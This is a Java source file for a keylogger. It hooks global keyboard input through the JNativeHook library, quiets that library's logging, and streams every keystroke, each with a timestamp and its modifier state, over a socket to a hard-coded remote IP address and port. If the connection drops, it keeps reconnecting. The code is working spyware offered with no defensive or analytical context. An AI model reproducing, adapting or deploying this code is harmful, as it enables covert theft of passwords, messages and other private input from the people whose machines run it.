package fr.kezua.kl;

import java.io.IOException;
import java.net.Socket;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyAdapter;
import org.jnativehook.keyboard.NativeKeyEvent;

public class Main extends NativeKeyAdapter {
	
	public static int index = 0;
	
	public static Socket sock = null;
	public static boolean connected = false;
	public static boolean connecting = false;

	public static void main(String[] args) throws IOException {
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);
		logger.setUseParentHandlers(false);

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new Main());
		
		connect();
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				while(true) {
					String str = SocketUtils.getReceived(sock);
					if(str == null) {
						connected = false;
						connect();
						return;
					}
				}
				
			}
		}).start();
	}
	
	public static void connect() {
		if(connected) return;
		try {
			Main.sock = new Socket("178.170.39.33", 4646);
			connected = true;
		}catch(Exception e) {
			connected = false;
			try {
				Thread.sleep(5000);
			} catch (InterruptedException e1) {}
			connect();
		}
		
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		String c = NativeKeyEvent.getKeyText(arg0.getKeyCode());
		if(arg0.getModifiers() == 0) c = c.toLowerCase();
		else c = c.toUpperCase();
		
		index++;
		
		String spa = "                      ";
		for(int i = 0; i < c.length(); i++) {
			spa = spa.replaceFirst(" ", "");
		}
		
		
		Date date = new Date();  
		DateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");  
		String strDate = dateFormat.format(date);  
		
		c = strDate+"> "+c+spa+"[Modifier = '"+arg0.getModifiers()+"']\n";
			
		SocketUtils.sendToSocket(sock, c);
			
	}
	
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		super.nativeKeyReleased(arg0);
		index--;
		if(arg0.getKeyCode() == 42) {
			
			
			Date date = new Date();  
			DateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");  
			String strDate = dateFormat.format(date);  
			String c = strDate+"> MAJ RELEASED !\n";
			SocketUtils.sendToSocket(sock, c);

		}
	}	
}
